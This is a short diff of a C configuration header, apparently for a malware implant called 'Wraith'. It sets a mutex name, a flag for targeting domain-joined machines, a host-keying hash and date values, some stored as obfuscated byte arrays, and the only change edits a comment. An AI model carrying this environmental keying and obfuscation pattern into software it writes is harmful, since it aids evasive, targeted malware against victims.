@@ -2,7 +2,7 @@
 
 /*
 #define MUTEX_NAME "Wraith"
-#define WORKSTATION // Comment it if not targeting a domain joined machine
+#define WORKSTATION // Comment it if targeting a domain joined machine
 #define HOST_ARTIFACT "e76d45370550a00b770abdee4ddd35361dcf3f0d861e34712a87af0b3ac7bcad"
 #define YEAR 2020
 #define MONTH 10
@@ -16,7 +16,7 @@
 */
 
 #define MUTEX_NAME {0,37,54,62,35,63}
-#define WORKSTATION // Comment it if not targeting a domain joined machine
+#define WORKSTATION // Comment it if targeting a domain joined machine
 #define HOST_ARTIFACT {50,96,97,51,99,98,100,96,103,98,98,103,54,103,103,53,96,96,103,54,53,51,50,50,99,51,51,51,100,98,100,97,102,51,52,49,100,49,103,51,111,97,102,50,100,99,96,102,101,54,111,96,54,49,103,53,100,54,52,96,53,52,54,51}
 #define YEAR 2020
 #define MONTH 10
